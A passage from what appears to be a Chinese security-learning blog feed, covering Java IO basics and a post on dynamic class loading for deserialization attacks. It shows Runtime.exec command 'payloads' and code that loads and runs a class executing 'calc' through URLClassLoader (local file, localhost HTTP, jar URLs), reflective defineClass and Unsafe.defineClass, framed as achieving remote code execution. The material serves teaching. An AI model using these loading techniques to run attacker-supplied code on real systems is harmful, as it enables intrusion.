class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileCopy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        copyFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFile</span><span class="hljs-params">()</span>&#123;<br>        String srcFilename=<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        String desFilename=<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(srcFilename);<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(desFilename);<br>            <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>((readLen=fileInputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                fileOutputStream.write(cache,<span class="hljs-number">0</span>,readLen);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileInputStream.close();<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919141632305.png" alt="image-20230919141632305"></p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><p>FileReader用来读取字符流，一个字符一个字符读取，可以无乱码输出中文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReaderPrint</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filepath);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">char</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">5</span>];<br>            <span class="hljs-keyword">while</span> ((readLen=fileReader.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileReader.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919142300021.png" alt="image-20230919142300021"></p><h3 id="Runtime执行命令payload"><a href="#Runtime执行命令payload" class="headerlink" title="Runtime执行命令payload"></a>Runtime执行命令payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-comment">//ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-comment">//byteArrayOutputStream.write(cache,0,readLen);</span><br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>        &#125;<br>        <span class="hljs-comment">//System.out.println(byteArrayOutputStream);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919143512950.png" alt="image-20230919143512950"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-类的动态加载</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化-类的动态加载"><a href="#java反序列化-类的动态加载" class="headerlink" title="java反序列化-类的动态加载"></a>java反序列化-类的动态加载</h1><h2 id="类加载器定义"><a href="#类加载器定义" class="headerlink" title="类加载器定义"></a>类加载器定义</h2><p>类加载器是一个负责加载类的对象。<code>ClassLoader</code> 是一个抽象类。每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p><h2 id="几种类加载器"><a href="#几种类加载器" class="headerlink" title="几种类加载器"></a>几种类加载器</h2><h3 id="引导类加载器-bootstrap-class-loader"><a href="#引导类加载器-bootstrap-class-loader" class="headerlink" title="引导类加载器(bootstrap class loader)"></a>引导类加载器(bootstrap class loader)</h3><p>它用来加载 Java 的核心库(jre&#x2F;lib&#x2F;rt.jar)，是用原生C++代码来实现的，并不继承自java.lang.ClassLoader。加载扩展类和应用程序类加载器，并指定他们的父类加载器，在java中获取不到。</p><h3 id="扩展类加载器-extensions-class-loader"><a href="#扩展类加载器-extensions-class-loader" class="headerlink" title="扩展类加载器(extensions class loader)"></a>扩展类加载器(extensions class loader)</h3><p>它用来加载 Java 的扩展库(jre&#x2F;ext&#x2F;*.jar)。Java 虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。</p><h3 id="应用程序类加载器-AppClassLoader"><a href="#应用程序类加载器-AppClassLoader" class="headerlink" title="应用程序类加载器(AppClassLoader)"></a>应用程序类加载器(AppClassLoader)</h3><p>它根据 Java 应用的类路径(CLASSPATH)来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过<br>ClassLoader.getSystemClassLoader()来获取它。</p><h3 id="自定义类加载器-custom-class-loader"><a href="#自定义类加载器-custom-class-loader" class="headerlink" title="自定义类加载器(custom class loader)"></a>自定义类加载器(custom class loader)</h3><p>除了系统提供的类加载器以外，开发人员可以通过继承 java.lang.ClassLoader类的方式实现自己的类加载器，以满足一些特殊的需求。</p><p>这里引用javaguide的一张图：</p><p><img src="/2023/04/27/file-upload/classloader.png" alt="classloader"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><ul><li><p>在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载（每个父类加载器都会走一遍这个流程）。</p></li><li><p>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。这样的话，所有的请求最终都会传送到顶层的启动类加载器 <code>BootstrapClassLoader</code> 中。</p></li><li><p>只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载（调用自己的 <code>findClass()</code> 方法来加载类）。</p></li><li><p>如果子类加载器也无法加载这个类，那么它会抛出一个 <code>ClassNotFoundException</code> 异常。</p></li></ul><h2 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h2><p>我们编写的 <code>.java</code> 代码文件通过编译将会生成 <code>.class</code> 文件，最初的方式就是通过 JDK 的 <code>javac</code> 指令来编译，再通过 <code>java</code> 命令执行 main 方法所在的类，从而执行Java 程序。而在这中间所生成的 .class 文件中的内容，就是 JVM 可以处理运行的字节码（Byte Code），它由 JVM 解释为对应系统可运行的机器指令。</p><p><strong>TIPS：<code>ClassLoader.loadClass()</code>方法不会进行类的初始化，如果后面再使用<code>newInstance()</code>进行初始化，就和正常场景时一样的顺序加载对应的代码块。</strong></p><h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><ul><li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p></li></ul><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>新建Calc.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过javac命令，编译成.class文件，接着把class文件复制到D盘下。</p><p>新建FileRce.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过file协议，在本地文件D盘中查找Calc类，运行如下：</p><p><img src="/2023/04/27/file-upload/image-20231007142653826.png" alt="image-20231007142653826"></p><h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p>这里在本地先起一个python的http server，接着通过HTTPRce.java来加载class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231007143001259.png" alt="image-20231007143001259"></p><h4 id="file-jar协议"><a href="#file-jar协议" class="headerlink" title="file+jar协议"></a>file+jar协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要先将class文件打包成jar：</p><p><code>jar -cvf Calc.jar Clac.class</code></p><p><img src="/2023/04/27/file-upload/image-20231007143957941.png" alt="image-20231007143957941"></p><p><img src="/2023/04/27/file-upload/image-20231007143917450.png" alt="image-20231007143917450"></p><h4 id="http-jar协议"><a href="#http-jar协议" class="headerlink" title="http+jar协议"></a>http+jar协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPJarRCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里需要用python起一个http server。</p><p><img src="/2023/04/27/file-upload/image-20231007144421503.png" alt="image-20231007144421503"></p><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>(Class) method.invoke(classLoader,<span class="hljs-string">&quot;Calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);<br>        c.newInstance();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>defineClass是ClassLoader中的一个方法：</p><p><img src="/2023/04/27/file-upload/image-20231007150913651.png" alt="image-20231007150913651"></p><p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p><p>由于该方法是protected，所以需要通过反射进行调用 <code>defineClass()</code> 方法进行字节码的加载，最后跟前面的步骤一样，通过newInstance进行初始化：</p><p><img src="/2023/04/27/file-upload/image-20231007150604318.png" alt="image-20231007150604318"></p><h3 id="Unsafe加载字节码"><a href="#Unsafe加载字节码" class="headerlink" title="Unsafe加载字节码"></a>Unsafe加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="hljs-string">&quot;Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length, classLoader, <span class="hljs-literal">null</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231007152859809.png" alt="image-20231007152859809"></p><p>这里相对要复杂一点。首先是导入所需的类和包，包括<code>sun.misc.Unsafe</code>和一些Java核心类。接着创建一个<code>ClassLoader</code>对象，该对象是系统类加载器。随后获取<code>Unsafe</code>类的<code>Class</code>对象，通过反射获取<code>Unsafe</code>类中的<code>theUnsafe</code>字段，并设置其可访问性。再使用反射获取<code>theUnsafe</code>字段的值，即<code>Unsafe</code>类的实例，使用反射获取<code>Unsafe</code>类中的<code>defineClass</code>方法，该方法用于定义一个新的类。后面通过Files读取文件系统中的字节码文件，这里假设文件路径为”D:\Calc.class”。最后调用<code>defineClass</code>方法，使用<code>Unsafe</code>实例来定义一个名为”Calc”的类，传递字节码、类加载器和保护域等参数，将返回的<code>Class</code>对象赋值给<code>calc</code>变量，用<code>newInstance</code>方法创建<code>calc</code>类的实例，从而触发远程代码执行。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-反序列化概念&amp;&amp;URLDNS链</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5/</url>
    
